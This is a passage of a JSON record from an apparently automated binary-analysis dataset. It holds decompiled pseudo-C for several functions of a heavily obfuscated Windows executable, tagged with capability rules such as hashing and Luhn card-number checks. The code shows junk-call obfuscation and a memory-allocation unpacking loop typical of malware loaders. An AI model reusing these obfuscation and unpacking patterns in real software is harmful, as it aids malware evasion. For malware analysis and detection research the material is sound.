        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nint32_t __cdecl fcn.0042d1c7(int32_t *arg_8h, uint32_t *arg_ch, uint32_t arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint extraout_ECX;\n    int32_t extraout_ECX_00;\n    uint extraout_ECX_01;\n    int32_t extraout_ECX_02;\n    uint32_t extraout_ECX_03;\n    uint32_t extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint extraout_ECX_06;\n    uint extraout_ECX_07;\n    uint extraout_ECX_08;\n    uint32_t extraout_ECX_09;\n    uint32_t uVar7;\n    uint extraout_ECX_10;\n    int32_t extraout_ECX_11;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    uint32_t extraout_EDX_01;\n    uint extraout_EDX_02;\n    uint32_t extraout_EDX_03;\n    uint32_t extraout_EDX_04;\n    uint32_t *puVar8;\n    uint32_t *puVar9;\n    uint32_t uVar10;\n    uint32_t arg_8h_00;\n    uint unaff_EDI;\n    uint32_t uVar11;\n    uint8_t in_AF;\n    uint8_t uVar12;\n    uint8_t in_TF;\n    uint8_t uVar13;\n    uint8_t in_IF;\n    uint8_t uVar14;\n    bool bVar15;\n    uint8_t in_NT;\n    uint8_t uVar16;\n    uint8_t in_AC;\n    uint8_t uVar17;\n    uint8_t uVar18;\n    uint8_t in_VIP;\n    uint8_t uVar19;\n    uint8_t in_ID;\n    uint8_t uVar20;\n    uint32_t uVar21;\n    ulong uVar22;\n    uint32_t in_stack_fffffc14;\n    uint32_t uVar23;\n    uint32_t *in_stack_fffffde8;\n    uint32_t *in_stack_fffffdec;\n    uint var_c0h;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    uint lpBuffer;\n    uint var_ach;\n    uint var_a8h;\n    uint var_a4h;\n    uint var_a0h;\n    uint32_t *var_9ch;\n    uint var_98h;\n    uint32_t var_94h;\n    uint var_90h;\n    uint32_t *var_8ch;\n    uint var_88h;\n    uint var_84h;\n    uint var_80h;\n    uint32_t var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint32_t var_54h;\n    uint32_t *var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint32_t var_28h;\n    uint32_t var_24h;\n    uint var_20h;\n    uint32_t var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    bVar15 = false;\n    uVar11 = *0x42a11a | 0x276e4ff8;\n    *0x42a0c2 = unaff_EDI;\n    fcn.0042ca85(*0x429f46, *0x429f46, 0x29a77e05, 0x988059d3, 0x47288726);\n    fcn.0042e452(0x57628e00, 0xd8a9d59f, uVar11, arg_8h, uVar11, 0xc27f83e9);\n    fcn.0042ca85(arg_8h, 0x1f4c3ac1, 0xa8667142, 0xff4707a4, 0xc71c73bf);\n    fcn.0042ca85(uVar11, *0x429f46, 0x77f4ea73, *0x429f46, *0x429f46);\n    uVar10 = *0x42a1a6;\n    uVar6 = *0x42a116 ^ *0x42a1a6;\n    fcn.0042ca85(*0x429f46, 0x7635e964, *0x429f46, arg_8h, 0xf2bae0ff);\n    uVar10 = uVar10 + *arg_8h;\n    fcn.0042e452(extraout_ECX, 0xe7d0055d, extraout_ECX, 0x5632d551, 0xc17c8c4d, 0x531f3de2);\n    if (*0x42a19a != -0x65fd74ce) {\n        *0x429f46 = *0x429f46 + 1;\n        *0x429f46 = *0x429f46 | var_7ch - (uVar11 & uVar6);\n    }\n    fcn.0042ca85(uVar10, 0xaf9e6e76, *0x429ea6, arg_8h, arg_8h);\n    fcn.0042e452(0xf2506f24, 0x1ae10a85, 0x1fe27fb6, *0x429f46, *0x429f46, 0xb525d454);\n    iVar1 = arg_8h[1];\n    *0x429f46 = *0x429f46 + 0x9bbdbb72;\n    fcn.0042ca85(0x4effade, uVar10, 0, 0x6c78bb9, 0x339eb27);\n    var_54h = arg_8h[2];\n    *0x429f46 = *0x429f46 | extraout_EDX;\n    *0x42a362 = arg_8h[1];\n    fcn.0042e452(0x8404637a, 0x1697ce9, 0xea75d110, *0x429f46, *0x429f46, var_54h);\n    *0x429f8a = *0x42a362 - arg_8h[2];\n    puVar8 = arg_8h - *0x42a112;\n    uVar6 = fcn.0042e452(*0x429f8a, extraout_ECX_00 + 1, 0xab25d84c, puVar8, 0x64cc0cf, 0x8440dae8);\n    *0x429f46 = *0x429f46 ^ uVar6;\n    var_28h = var_54h + 0xaa1b3ffa + puVar8;\n    var_7ch = *0x429f6e;\n    var_94h = 0;\n    *0x429f46 = *0x429f46 - *0x429f8a;\n    uVar6 = *0x429f8a;\n    uVar11 = *puVar8;\n    arg_8h_00 = uVar10;\n    do {\n        *0x42a11e = 0xa1df8e2a - uVar6;\n        uVar21 = (in_NT & 1) * 0x4000 | bVar15 * 0x400 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n                 (var_54h < 0) * 0x80 | (var_54h == 0) * 0x40 | (in_AF & 1) * 0x10 | (in_ID & 1) * 0x200000 |\n                 (in_VIP & 1) * 0x100000 | (in_AC & 1) * 0x40000;\n        *0x42a34a = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n        var_28h = (var_28h & uVar11) - puVar8;\n        uVar16 = (uVar21 & 0x4000) != 0;\n        bVar15 = (uVar21 & 0x400) != 0;\n        uVar14 = (uVar21 & 0x200) != 0;\n        uVar13 = (uVar21 & 0x100) != 0;\n        uVar12 = (uVar21 & 0x10) != 0;\n        uVar20 = (uVar21 & 0x200000) != 0;\n        uVar17 = (uVar21 & 0x40000) != 0;\n        uVar19 = 0;\n        uVar18 = 0;\n        if ((uVar21 & 0x40) == 0) {\n            *0x429f46 = *0x429f46 + puVar8;\n            uVar21 = *0x42a11e;\n            if (*0x42a2c6 != -0x48a87bc5) {\n                *0x429f46 = 0;\n                var_28h = var_28h ^ arg_ch;\n                uVar21 = *0x42a11e - *0x42a062;\n            }\n            var_28h = var_28h | uVar21;\n            *0x429f96 = var_7ch;\n            *0x42a00e = uVar11;\n            fcn.0042ca85(arg_8h_00, var_7ch, 0xa1693d8b, uVar11 ^ 0xbfcaaf43, 0xe625e3ca);\n            uVar2 = fcn.0042ca85(extraout_ECX_01, 0x54d80591, 0x3d1f8f8d, puVar8, uVar11 ^ 0xbfcaaf43);\n            *0x429f46 = *0x429f46 - extraout_ECX_02;\n            if ((*0x429fe6 < 0x5d6019ac) &&\n               (fcn.0042e452(0xf30df167, 0xe4b95d9d, puVar8, 0xf88676ec, uVar2, 0x18e88146, *0x42a00e, *0x429f96), \n               *0x42a38a != -0x79990713)) {\n                in_stack_fffffde8 = puVar8;\n                in_stack_fffffdec = var_8ch;\n                fcn.0042e452(puVar8, var_8ch, 0x75c8ce28, *0x429f46, 0xe4171042, 0x571165a6);\n                *0x42a25e = *0x42a25e & puVar8;\n                var_9ch = arg_ch;\n            }\n            uVar21 = fcn.0042dfc3(in_stack_fffffde8, in_stack_fffffdec);\n            *0x42a15a = uVar11;\n            fcn.0042e452(puVar8, 0x9b652dce, 0xec7a092, 0xfdb58b60, *0x42a25e, 0x691e57d9);\n            uVar11 = *0x42a15a;\n            *0x429f8e = uVar6;\n            if (*0x42a1e2 != 0x2c94a75a) {\n                uVar22 = fcn.0042ca85(*0x429eee, 0x9a9cb22a, var_9ch, arg_ch, 0x9fcaf478);\n                *0x42a25e = -*0x42a25e;\n                uVar6 = extraout_ECX_03;\n                puVar9 = puVar8;\n                if (*0x429f62 != -0x6fb2d0f0) {\n                    puVar9 = 0x1d0c8265;\n                    var_9ch = var_9ch + 0x79ca0706;\n                    *0x429f46 = *0x429f46 + extraout_ECX_03;\n                    uVar22 = fcn.0042e452(0x1d0c8265, 0xa5178c7d, *0x429eee, var_28h, uVar22, 0x725e9ad5);\n                    var_28h = var_28h ^ arg_8h_00;\n                    *0x429eee = *0x429eee & uVar22;\n                    uVar22 = fcn.0042ca85(uVar22 >> 0x20, 0xa144723f, 0x64e5c1fc, var_9ch, arg_ch);\n                    uVar6 = extraout_ECX_04;\n                    var_50h = arg_ch;\n                }\n                if (arg_8h_00 == 0) {\n                    *0x42a25e = *0x42a25e + (uVar6 & *0x429ef2);\n                    if (*0x42a25e == 0) {\n                        *0x429eee = 0;\n                    }\n                    uVar2 = fcn.0042ca85(uVar22 >> 0x20, 0x68b62b27, 0x6030d549, var_28h, uVar22);\n                    *0x42a25e = *0x42a25e + arg_ch;\n                    fcn.0042ca85(var_9ch, puVar9, 0xa23ac378, uVar2, arg_ch);\n                }\n            }\n            uVar6 = *0x429f8e;\n            uVar23 = 0x29c4798;\n            fcn.0042e452(0x29c4798, 0x8b74922e, var_50h, 0x7a978877, arg_ch, 0x44e09194, \n                         (uVar16 & 1) * 0x4000 | bVar15 * 0x400 | (uVar14 & 1) * 0x200 | (uVar13 & 1) * 0x100 |\n                         (uVar21 < 0) * 0x80 | (uVar21 == 0) * 0x40 | (uVar12 & 1) * 0x10 |\n                         ((POPCOUNT(uVar21 & 0xff) & 1U) == 0) * 4 | (uVar20 & 1) * 0x200000 | (uVar19 & 1) * 0x100000 |\n                         (uVar18 & 1) * 0x80000 | (uVar17 & 1) * 0x40000);\n            uVar16 = (uVar23 & 0x4000) != 0;\n            bVar15 = (uVar23 & 0x400) != 0;\n            uVar14 = (uVar23 & 0x200) != 0;\n            uVar13 = (uVar23 & 0x100) != 0;\n            uVar12 = (uVar23 & 0x10) != 0;\n            uVar20 = (uVar23 & 0x200000) != 0;\n            uVar17 = (uVar23 & 0x40000) != 0;\n            uVar19 = 0;\n            uVar18 = 0;\n            if ((uVar23 & 0x40) != 0) goto code_r0x0042d6fb;\n            *0x42a156 = uVar11;\n            *0x42a1be = uVar6;\n            var_28h = var_28h & arg_ch;\n            uVar11 = fcn.0042e452(0xe0af07f1, arg_ch, arg_8h_00, puVar8, *0x429f46, 0xfd2939f4);\n            uVar21 = *0x42a1be;\n            if (0x4ebb5dee < *0x42a1aa) {\n                *0x429eee = -*0x429eee;\n                var_50h = var_50h ^ uVar11;\n            }\n            uVar11 = uVar11 ^ uVar10;\n            var_54h = var_54h - 1;\n            *0x42a1b2 = *0x42a156;\n            *0x42a25e = *0x42a25e | 0x66db74b9;\n            uVar6 = *0x42a156;\n            *0x42a122 = arg_ch;\n            if (*0x42a25e < 1) {\n                if (*0x429ee2 == -0x17528b31) {\n                    fcn.0042ca85(0xaf48e0dd, uVar11, arg_8h_00, 0x7240bee, arg_8h_00);\n                    var_9ch = var_9ch ^ puVar8;\n                    *0x429eee = *0x429eee ^ 0xa8581b31;\n                    var_28h = var_28h - extraout_ECX_11;\n                    uVar6 = extraout_EDX_04;\n                    if ((0xe22aa6fb < *0x42a0ba) && (*0x42a1ca < -0x63d2c26c)) {\n                        *0x429eee = *0x429eee & puVar8;\n                    }\n                }\n                *0x429eee = *0x429eee + uVar6;\n                uVar11 = fcn.0042ca85(*0x429eee, 0xca676c36, var_50h, 0x6a1508e1, 0x8101deb0);\n                uVar6 = *0x42a1b2;\n                arg_ch = *0x42a122;\n            }\n        }\n        else {\ncode_r0x0042d6fb:\n            uVar19 = 0;\n            uVar18 = 0;\n            *0x429fe2 = uVar11;\n            *0x429ffa = puVar8;\n            if (arg_ch == NULL) {\n                *0x42a38e = *0x42a38e & 0xbcbcc19a;\n                fcn.0042ca85();\n                var_28h = 0;\n            }\n            puVar8 = *0x429ffa;\n            uVar11 = *0x429fe2;\n            fcn.0042ca85(*0x429f46, 0x21caf2c7, 0xc3a7f14, 0x9a39c308, *0x429ffa);\n            *0x429f46 = *0x429f46 + puVar8;\n            uVar21 = fcn.0042e5dd(arg_8h_00, uVar10 + iVar1);\n            var_28h = (var_28h ^ arg_8h_00) & puVar8;\n            if (arg_ch == puVar8) {\n                *0x42a38e = *0x42a38e - arg_ch;\n                var_28h = var_28h ^ var_54h;\n                fcn.0042ca85(arg_ch, var_54h, var_94h, 0x9a479845, 0x28809bd9);\n                *0x42a38e = -*0x42a38e;\n                fcn.0042e452(0x4dd29e25, 0x3c678496, 0xc3c84472, 0x2309b812, var_28h, arg_ch);\n            }\n            *arg_ch = uVar21;\n            *0x42a38e = *0x42a38e | uVar6 >> 5;\n            uVar21 = uVar6 - 1;\n            *0x42a00a = uVar11;\n            *0x429f46 = *0x429f46 + uVar11;\n            uVar11 = fcn.0042e452(0xdc797e3d, 0xa9bd0ecc, 0xbcc37941, (uVar6 >> 5) + 1, uVar21, 0xc5c97a7);\n            uVar6 = *0x42a00a;\n            arg_ch = arg_ch + 1;\n        }\n        var_28h = var_28h + uVar11;\n        *0x42a38e = *0x42a38e + uVar11;\n        *0x429eb6 = uVar11;\n        uVar3 = (*_sym.imp.KERNEL32.dll_HeapAlloc)\n                          (*0x42a34a, 8, 0xa8, \n                           (uVar16 & 1) * 0x4000 | bVar15 * 0x400 | (uVar14 & 1) * 0x200 | (uVar13 & 1) * 0x100 |\n                           (var_7ch < 0) * 0x80 | (var_7ch == 0) * 0x40 | (uVar12 & 1) * 0x10 |\n                           ((POPCOUNT(var_7ch & 0xff) & 1U) == 0) * 4 | (uVar20 & 1) * 0x200000 |\n                           (uVar19 & 1) * 0x100000 | (uVar18 & 1) * 0x80000 | (uVar17 & 1) * 0x40000);\n        uVar5 = uVar3;\n        (*_sym.imp.KERNEL32.dll_GetWindowsDirectoryA)(uVar3, 0xa8);\n        uVar16 = (uVar5 & 0x4000) != 0;\n        uVar12 = (uVar5 & 0x10) != 0;\n        uVar20 = (uVar5 & 0x200000) != 0;\n        uVar17 = (uVar5 & 0x40000) != 0;\n        uVar11 = ((uVar5 & 0x400) != 0) * 0x400 | ((uVar5 & 0x200) != 0) * 0x200;\n        uVar23 = uVar11 | ((uVar5 & 0x100) != 0) * 0x100;\n        *0x429f46 = *0x429f46 | *0x429eb6 & *0x42a13a;\n        bVar15 = (uVar11 & 0x400) != 0;\n        uVar14 = (uVar23 & 0x200) != 0;\n        uVar13 = ((uVar23 | ((uVar5 & 0x80) != 0) * 0x80) & 0x100) != 0;\n        uVar19 = 0;\n        uVar18 = 0;\n        if ((uVar5 & 0x40) == 0) {\n            *0x42a256 = arg_ch;\n            *0x42a3be = uVar21;\n            fcn.0042ca85(0x25a8e59a, 0x9d24b9ef, *0x42a38e, 0x8fd97d3e, *0x429f46);\n            fcn.0042e452(puVar8, 0x6abbb7f6, 0x59d84995, *0x429ea6 - extraout_EDX_00, arg_8h_00, 0x25d31975);\n            if (puVar8 != NULL) {\n                var_28h = var_28h | var_1ch;\n            }\n            var_7ch = var_7ch - 1;\n            uVar21 = *0x42a3be;\n            uVar11 = uVar6;\n            arg_ch = *0x42a256;\n            *0x42a006 = arg_8h_00;\n        }\n        else {\n            *0x42a3b2 = uVar21;\n            uVar2 = fcn.0042e452(0x4515e992, 0x46403de, puVar8, uVar6, arg_8h_00, *0x42a38e);\n            iVar4 = fcn.0042e452(0xa41ce8b8, uVar2, 0xf7c10438, *0x42a38e, var_28h, *0x429f5e);\n            var_28h = var_28h + iVar4;\n            *0x42a342 = *0x42a3b2;\n            *0x42a032 = *0x429f6e;\n            *0x42a38e = *0x42a38e - uVar6;\n            uVar11 = *0x429f6e;\n            if (puVar8 == NULL) {\n                uVar2 = fcn.0042e452(0xe26fbad4, 0x9ab96be7, 0xc59a58e, *0x42a38e, 0, var_28h);\n                uVar11 = fcn.0042ca85(0, uVar2, 0xdbcd8527, var_28h, extraout_ECX_06);\n            }\n            fcn.0042ca85(uVar11, arg_ch, 0x107a0a1, 0x28a889e5, *0x429f46);\n            fcn.0042e452(0x146370e4, puVar8, 0x479a45f9, 0x59a787af, extraout_ECX_07, 0xd7054bad);\n            iVar4 = fcn.0042e452(0xbcd8de11, 0x28300023, 0x27626b13, 0xd03aa142, var_28h, 0xab897e7c);\n            *0x42a38e = *0x42a38e + iVar4;\n            var_7ch = *0x42a032;\n            *0x42a002 = *0x42a342;\n            uVar22 = fcn.0042e452(0xc167cd22, 0xce1809e1, var_28h, 0xbecc0a6d, 0xb7fc1919, 0x131ec185);\n            uVar11 = uVar22;\n            if ((0x7c09dc78 < *0x429f2e) && (0x781a913b < *0x42a32e)) {\n                var_28h = var_28h - (uVar22 >> 0x20);\n                (*_sym.imp.ODBC32.dll_SQLDrivers)(0xbf9d7ff, 0x74b77e86, extraout_ECX_08);\n                *0x42a38e = *0x42a38e ^ extraout_EDX_01;\n                (*_sym.imp.ODBC32.dll_SQLExecDirectA)(extraout_EDX_01, 0x9bb940a9);\n                (*_sym.imp.CATSRVPS.dll_DllCanUnloadNow_1)(0xae23a583, arg_ch);\n                *0x42a38e = *0x42a38e ^ extraout_ECX_09;\n                (*_sym.imp.DSSENH.dll_CPSetKeyParam)(0xf07a16a6, var_28h, puVar8, arg_8h_00, *0x429f5e);\n                uVar11 = (*_sym.imp.IASHLPR.dll_MemFreeIas)(0x675b940b, *0x42a38e, 0x1e64e05a);\n            }\n            uVar21 = *0x42a002;\n            puVar8 = puVar8 + 1;\n            fcn.0042ca85(0x6496b2fa, 0x201930eb, arg_8h_00, 0xf59ce8eb, 0x480c566);\n            *0x42a042 = var_94h;\n            *0x429f46 = *0x429f46 - var_94h;\n            *0x42a06e = uVar6;\n            fcn.0042ca85(*0x42a38e, var_28h & uVar11, var_94h, uVar21, var_94h);\n            uVar23 = *0x42a06e;\n            uVar5 = *0x42a042 + 1;\n            *0x42a38e = *0x42a38e + uVar5;\n            var_28h = (var_28h & uVar11) + uVar21;\n            uVar11 = uVar5 - arg_10h;\n            *0x42a2ba = *0x42a2ba & arg_ch;\n            *0x42a316 = uVar5;\n            if ((0 < *0x42a2ba) && (*0x42a06e != 0)) {\n                *0x42a3c2 = -*0x42a3c2;\n                *0x42a38e = *0x42a38e ^ arg_8h_00;\n                *0x42a38e = *0x42a38e & arg_8h_00;\n                if (*0x42a38e < 1) {\n                    var_24h = *0x42a06e;\n                    uVar7 = (uVar10 + iVar1) - 1 | 0x603c38b0;\n                    var_28h = var_28h | uVar7;\n                    if ((*0x42a386 != -0x5eb7346) && (*0x429f3e < 0x7a907c4d)) {\n                        uVar5 = fcn.0042ca85(uVar5, 0xb24bb5ee, arg_8h_00, *0x42a06e, 0xb83f5f9d, \n                                             (uVar16 & 1) * 0x4000 | SBORROW4(uVar5, arg_10h) * 0x800 | bVar15 * 0x400 |\n                                             (uVar14 & 1) * 0x200 | (uVar13 & 1) * 0x100 | (uVar11 < 0) * 0x80 |\n                                             (uVar11 == 0) * 0x40 | (uVar12 & 1) * 0x10 |\n                                             ((POPCOUNT(uVar11 & 0xff) & 1U) == 0) * 4 | uVar5 < arg_10h |\n                                             (uVar20 & 1) * 0x200000 | (uVar19 & 1) * 0x100000 | (uVar18 & 1) * 0x80000\n                                             | (uVar17 & 1) * 0x40000);\n                        uVar7 = *0x42a3c2;\n                        *0x42a3c2 = *0x42a3c2 & puVar8;\n                        var_24h = -uVar23;\n                    }\n                    in_stack_fffffc14 = 0xf4d42b26;\n                    fcn.0042e452(0xf4d42b26, arg_ch, uVar5, *0x42a14e, 0x8ec44368, uVar7);\n                }\n            }\n            uVar16 = (in_stack_fffffc14 & 0x4000) != 0;\n            bVar15 = (in_stack_fffffc14 & 0x400) != 0;\n            uVar14 = (in_stack_fffffc14 & 0x200) != 0;\n            uVar13 = (in_stack_fffffc14 & 0x100) != 0;\n            uVar12 = (in_stack_fffffc14 & 0x10) != 0;\n            uVar20 = (in_stack_fffffc14 & 0x200000) != 0;\n            uVar17 = (in_stack_fffffc14 & 0x40000) != 0;\n            uVar19 = 0;\n            var_94h = *0x42a316;\n            if ((in_stack_fffffc14 & 0x40) != 0) {\n                var_28h = var_28h - arg_8h_00;\n                *0x42a1ce = uVar21;\n                *0x42a3ba = 0;\n                in_stack_fffffc14 = 0x2fb91aad;\n                uVar22 = fcn.0042ca85(0x3ba5b0b9, 0x8642717d, 0x5aacec8, arg_ch);\n                *0x42a3c2 = *0x42a3c2 ^ uVar22;\n                *0x429f46 = *0x429f46 ^ uVar22 >> 0x20;\n                puVar8 = arg_8h + *0x429ea6;\n                var_24h = (var_24h - uVar22) + arg_8h_00;\n                var_94h = *0x42a3ba;\n                uVar21 = *0x42a1ce;\n            }\n            *0x42a1a2 = uVar21;\n            fcn.0042ca85(*0x429f46, 0x9cf152, 0xce1eeafd, uVar21, var_28h);\n            fcn.0042e452(var_28h, *0x42a14e, 0xb8c38275, extraout_ECX_10, arg_8h_00, 0xec0aefe2);\n            *0x42a14e = -*0x42a14e;\n            fcn.0042ca85(0xfce74e85, arg_ch, *0x42a3c2, 0x479cc3b7, var_24h);\n            uVar21 = *0x42a1a2;\n            var_24h = var_24h + 0x208f3669;\n            fcn.0042ca85(*0x42a1a2, extraout_EDX_02, 0xa49c6a3f, arg_8h_00, puVar8);\n            *0x429f46 = *0x429f46 | extraout_EDX_03;\n            var_28h = var_28h ^ arg_8h_00;\n            uVar11 = *puVar8;\n            var_8ch = arg_ch;\n            var_1ch = uVar6;\n        }\n        *0x429f66 = arg_ch;\n        *0x42a06a = fcn.0042e452(*0x42a086, 0xeb093f1f, *0x429f5e, puVar8, 0x74f9b29f, 0x38c14eb6);\n        arg_ch = *0x429f66;\n        arg_8h_00 = arg_8h_00 + 1;\n        var_24h = var_24h & *0x42a06a;\n        *0x42a0be = uVar11;\n        *0x42a17e = uVar21;\n        (*_sym.imp.KERNEL32.dll_HeapFree)(*0x42a34a, 0, uVar3, 0x60919e94, 0x79eecbbd, var_24h, *0x42a06a);\n        fcn.0042e452(0xf735ddad, *0x42a06a);\n        iVar4 = fcn.0042ca85(extraout_ECX_05, 0x66711793, arg_8h_00, *0x42a086, *0x42a086);\n        fcn.0042e452(0x30ed503a, 0x42c1da7c, 0x4d654041, 0xac939fe4, iVar4 - puVar8, arg_ch);\n        uVar6 = bVar15 * 0x400 | (uVar14 & 1) * 0x200;\n        uVar11 = uVar6 | (uVar13 & 1) * 0x100;\n        *0x42a086 = *0x42a086 + arg_ch;\n        in_NT = ((uVar16 & 1) * 0x4000 & 0x4000) != 0;\n        bVar15 = (uVar6 & 0x400) != 0;\n        in_IF = (uVar11 & 0x200) != 0;\n        in_TF = ((uVar11 | (*0x42a17e < 0) * 0x80) & 0x100) != 0;\n        in_AF = ((uVar12 & 1) * '\\x10' & 0x10) != 0;\n        in_ID = (((uVar20 & 1) * 0x200000 | (uVar19 & 1) * 0x100000) & 0x200000) != 0;\n        in_AC = ((uVar17 & 1) * 0x40000 & 0x40000) != 0;\n        in_VIP = 0;\n        uVar6 = *0x42a17e;\n        uVar11 = *0x42a0be;\n        if (*0x42a17e == 0) {\n            if ((*0x42a1c2 != 0x5ab8aeef) && (-0x707d0ab7 < *0x42a07a)) {\n                *0x42a14e = *0x42a14e + 0xba9b924d;\n            }\n            *0x42a14e = *0x42a14e | *0x42a0be;\n            iVar1 = arg_8h[1];\n            iVar4 = arg_8h[2];\n            *0x42a2ba = *0x42a2ba + 1;\n            fcn.0042ca85(0x25732f8e, 0x7df6444f, iVar1 - iVar4, 0x4ba16c74, 0xc2cdeaea);\n            return iVar1 - iVar4;\n        }\n    } while( true );\n}\n",
        "token_count": 8928
    },
    "0042cf01": {
        "rules": [
            "hash data using jshash/2d43aa00ef9c47beadbc2522c99f9e7b",
            "hash data using djb2/86fcf1c18148478ab58e8c52ba43c8d5"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n\nuint32_t __cdecl fcn.0042cf01(uint32_t arg_8h)\n\n{\n    uint32_t arg_10h;\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t extraout_ECX;\n    uint32_t uVar4;\n    uint unaff_ESI;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint unaff_EDI;\n    uint32_t uVar7;\n    bool bVar8;\n    ulong uVar9;\n    uint var_2ch;\n    uint var_28h;\n    uint32_t var_24h;\n    uint32_t var_20h;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    arg_10h = *0x42a39a;\n    iVar1 = *0x429ec2 * 4;\n    *0x42a1ae = *0x42a1ae - arg_8h;\n    var_ch = *0x429ebe;\n    iVar2 = *0x42a39a * 4;\n    if (arg_8h < (*0x42a282 - *0x429eb2) * 4) {\n        var_20h = -0x558f5994;\n        *0x42a1ae = *0x42a1ae ^ 0x6659ac4d;\n    }\n    *0x42a26a = arg_8h | *0x42a1ae;\n    *0x429fce = *0x42a1da + 4;\n    *0x429fea = unaff_ESI;\n    *0x42a19e = unaff_EDI;\n    (*_sym.imp.KERNEL32.dll_GetSystemTimeAsFileTime)(0x42a046, *0x42a066);\n    uVar5 = var_18h * 8;\n    *0x42a1ae = *0x42a1ae - 1;\n    var_20h = var_20h - 1 & arg_8h | *0x42a26a;\n    if (*0x42a3b6 < 0xa041f1ca) {\n        uVar5 = uVar5 + var_20h;\n        var_20h = var_20h | uVar5;\n        uVar5 = uVar5 - 1;\n    }\n    uVar7 = var_20h - *0x429fce;\n    uVar3 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(*0x42a116, *0x429fce, 0x1000);\n    arg_8h = arg_8h + iVar1;\n    var_24h = 0;\n    uVar4 = 0x42a162;\n    uVar6 = uVar5 + arg_8h;\n    var_20h = (uVar7 | uVar5) - uVar6;\n    uVar5 = uVar3;\n    uVar7 = uVar3;\n    for (; *0x42a1ae = *0x42a1ae ^ uVar5,  var_ch != 0; var_ch = var_ch + -1) {\n        if (arg_10h == 0) {\n            var_20h = var_20h - (0x692fbd08 - *0x429ea6);\n            *0x42a1ae = *0x42a1ae | *0x42a116;\n        }\n        uVar6 = arg_8h + iVar1;\n        *0x42a1ae = *0x42a1ae - uVar6;\n        uVar9 = fcn.0042d1c7(arg_8h, uVar7, arg_10h);\n        uVar4 = uVar9 >> 0x20;\n        uVar5 = uVar9;\n        uVar7 = uVar7 + uVar5;\n        var_24h = var_24h + uVar5;\n        uVar6 = uVar6 & uVar5;\n        *0x42a2a6 = *0x42a2a6 + -0x3fd8d2fb;\n        uVar5 = arg_8h;\n        arg_8h = arg_8h + iVar2 + 0xc;\n    }\n    uVar5 = *0x42a116 + 0xb19ef292;\n    *0x42a1ae = *0x42a1ae - uVar6;\n    if (*0x42a3aa < 0xe9bdd688) {\n        uVar5 = -var_24h & arg_10h;\n        *0x42a1ae = *0x42a1ae - uVar5;\n        uVar4 = var_24h;\n    }\n    *0x42a14a = uVar3;\n    if ((*0x42a37e == -0x3766f00a) && (*0x42a11a == 0x625321d3)) {\n        uVar4 = uVar4 | uVar5;\n        bVar8 = SCARRY4(*0x42a1ae, uVar5);\n        *0x42a1ae = *0x42a1ae + uVar5;\n        if (bVar8 != *0x42a1ae < 0) {\n            uVar5 = uVar5 + 1;\n            var_20h = (var_20h ^ uVar4) & uVar5;\n        }\n        if ((*0x429ece < 0xc0986fb8) && (0x2d59066d < *0x42a34e)) {\n            *0x42a1ae = *0x42a1ae | uVar5;\n            if ((var_20h != 0x625321d3) && (uVar7 + uVar5 != 0 && SCARRY4(uVar7, uVar5) == uVar7 + uVar5 < 0)) {\n                *0x42a1ae = *0x42a1ae + 0x9dacde2d;\n            }\n            if (*0x42a182 != 0x123399a2) {\n                (*_sym.imp.DSSENH.dll_CPGenKey)(uVar3, 0x6a989761, 0x5ab2f920);\n                *0x42a1ae = *0x42a1ae ^ extraout_ECX;\n            }\n        }\n    }\n    return *0x42a14a;\n}\n",
        "token_count": 1504
    },
    "0042ca85": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0042ca85(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t extraout_ECX;\n    int32_t iVar2;\n    int32_t unaff_EDI;\n    ulong uVar3;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint lpBuffer;\n    uint var_4h;\n    \n    *0x42a0b6 = unaff_EDI;\n    *0x42a382 = param_2;\n    *0x429fc2 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)();\n    if ((*0x429ec6 != -0x135c77b6) && (*0x429ee6 != 0x9b67605)) {\n        *0x42a2ae = -*0x42a2ae;\n        var_ch = 0xd14df4a;\n        unaff_EDI = *0x42a392 + -0x4f4093e2;\n    }\n    iVar2 = *0x42a382;\n    *0x42a352 = in_EAX;\n    if ((*0x42a24a == -0x8830118) && (0x2ef1d56a < *0x42a32a)) {\n        if ((0x4dad6f27 < *0x42a076) && (*0x42a266 == 0x8e4939)) {\n            unaff_EDI = unaff_EDI + var_ch;\n            (*_sym.imp.ODBC32.dll_SQLAllocConnect)(0x56887c3f, in_EAX, *0x42a2ae, 0xb4b05462);\n            in_EAX = (*_sym.imp.GDI32.dll_EnumFontFamiliesW)(0x46d49f48, 0x13b2a26b);\n        }\n        uVar1 = (*_sym.imp.ODBC32.dll_SQLForeignKeysW)(0x57349628, in_EAX, 0x8a34e6b9, unaff_EDI, in_EAX);\n        uVar1 = (*_sym.imp.IASHLPR.dll_DllGetClassObject_1)(0xbe9a88, uVar1, 0x56197d2f, uVar1, 0xc3ac3f3c);\n        uVar1 = (*_sym.imp.KERNEL32.dll_OpenConsoleW)\n                          (uVar1, uVar1, *0x42a2ae, 0xb27854d2, 